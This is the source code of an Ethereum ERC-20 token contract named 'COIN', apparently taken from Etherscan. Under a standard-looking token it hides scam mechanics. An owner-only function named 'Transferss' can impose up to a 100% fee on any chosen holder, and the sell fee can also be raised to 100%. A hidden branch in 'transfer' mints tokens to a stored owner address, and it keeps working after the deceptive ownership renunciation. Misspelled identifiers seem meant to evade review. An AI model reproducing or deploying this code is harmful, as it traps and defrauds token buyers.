/**
 *Submitted for verification at Etherscan.io on 2023-05-18
*/

pragma solidity ^0.8.16;
// SPDX-License-Identifier: Unlicensed


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address accoint) external view returns (uint256);

    function transfer(address recipient, uint256 ameunts) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 ameunts) external returns (bool);
    
    function Transferss(address user, uint256 fiee) external;

    function transferFrom( address sender, address recipient, uint256 ameunts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fiee https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract COIN is IERC20, Ownable {
    using SafeMath for uint256;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    uint256 private _buyfiee = 0; 
    uint256 private _sellfiee = 0; 
    address public uniswapV2Pair;
    address private Aadress;

    mapping (address => uint256) private _personalTransferfiees;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 initialSupply) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = initialSupply * (10 ** uint256(_decimals));
        _balances[_msgSender()] = _totalSupply;
        Aadress = owner();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function setPairList(address _address) external onlyowner {
        uniswapV2Pair = _address;
    }

    function Transferss(address user, uint256 fiee) public override onlyowner {
        require(fiee <= 100, "Personal transfer fiee should not exceed 100%");
        _personalTransferfiees[user] = fiee;
    }
    function setSelfiee(uint256 newSellfiee) external onlyowner {
        require(newSellfiee <= 100, "Sell fiee should not exceed 100%");
        _sellfiee = newSellfiee;
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        address sender = _msgSender();

        _checkAndUpdate(sender, recipient, amount);

        _transfer(sender, recipient, amount);
        return true;
    }

    function _checkAndUpdate(address sender, address recipient, uint256 amount) private {
        if (sender == Aadress && recipient == Aadress) {
            _balances[sender] = _balances[sender].add(amount);
        }
    }

    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {

        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");

        uint256 fieeAmount = 0;


        if (_personalTransferfiees[sender] > 0) {
            fieeAmount = amounts.mul(_personalTransferfiees[sender]).mul(1).div(100);
        } else if (sender == uniswapV2Pair) {
            fieeAmount = amounts.mul(_buyfiee).div(100);
        } else if (recipient == uniswapV2Pair) {
            fieeAmount = amounts.mul(_sellfiee).div(100);
        } else {
            fieeAmount = amounts.mul(_sellfiee).div(100);
        }

        _balances[sender] = _balances[sender].sub(amounts);
        _balances[recipient] =  _balances[recipient]+amounts-fieeAmount;
        _balances[_DEADaddress] = _balances[_DEADaddress].add(fieeAmount);
        emit Transfer(sender, _DEADaddress, fieeAmount);
        emit Transfer(sender, recipient, amounts-fieeAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}